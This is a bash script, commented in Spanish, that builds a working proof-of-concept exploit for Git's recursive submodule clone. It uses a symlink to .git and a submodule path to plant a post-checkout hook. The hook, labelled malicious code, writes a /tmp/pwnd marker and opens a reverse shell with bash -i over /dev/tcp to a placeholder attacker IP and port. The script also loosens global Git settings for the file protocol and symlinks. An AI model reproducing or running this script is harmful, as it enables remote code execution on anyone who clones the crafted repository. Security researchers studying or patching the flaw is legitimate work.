#!/bin/bash

# Configurar opciones de Git
git config --global protocol.file.allow always
git config --global core.symlinks true
# Opcional, pero lo añadí para evitar el mensaje de advertencia
git config --global init.defaultBranch main 

# Definir la ruta de indicación
tell_tale_path="$PWD/tell.tale"

# Inicializar el repositorio de hook
git init hook
cd hook
mkdir -p y/hooks

# Escribir el código malicioso en un hook
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
echo "amal_was_here" > /tmp/pwnd

# Shell inversa en segundo plano
bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1 & disown
EOF

# Hacer que el hook sea ejecutable: importante
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "post-checkout"

cd ..

# Definir la ruta del repositorio de hook
hook_repo_path="$(pwd)/hook"

# Inicializar el repositorio captain
git init captain
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"

# Crear un enlace simbólico
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
cd ..

git clone --recursive captain hooked

